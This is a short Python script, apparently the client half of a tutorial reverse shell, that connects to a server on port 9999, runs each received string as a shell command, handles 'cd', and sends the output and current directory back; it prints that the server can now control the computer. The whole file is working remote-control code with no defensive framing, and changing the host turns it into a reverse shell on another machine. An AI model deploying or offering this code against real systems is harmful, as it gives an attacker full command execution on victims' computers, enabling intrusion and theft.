# import libraries

import socket
import os
import subprocess

s = socket.socket()
host = socket.gethostbyname(socket.gethostname())
# server and client should have same port number
port = 9999

# in  server we use bind here we use connect
s.connect((host, port))
print('connected to the server now server can control your computer through command prompt...')

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWd = os.getcwd() + ">"
        s.send(str.encode(output_str + currentWd))
        print(output_str)
